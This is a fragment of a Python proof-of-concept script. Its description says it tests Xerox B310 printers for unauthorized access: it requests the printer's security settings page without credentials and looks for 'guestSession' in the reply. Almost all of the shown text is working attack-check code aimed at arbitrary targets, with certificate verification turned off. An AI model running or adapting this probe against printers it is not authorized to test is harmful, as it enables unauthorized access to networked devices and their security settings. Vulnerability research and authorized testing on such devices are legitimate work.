...
def poc(target):
    payloade="/webglue/content?c=%2FSettings%2FSecurity&lang=zh-CN"
    try:
        res=requests.get(url=target,timeout=5,verify=False)
        if res.status_code==200:
            res1=requests.get(url=target+payloade,timeout=5,verify=False)
            if re.search('(guestSession)',res1.text).group(0)=="guestSession" and res1.status_code==200:
...
def main():
    a()
    parse=argparse.ArgumentParser(description="Xerox(R) B310 Printer存在未授权访问")
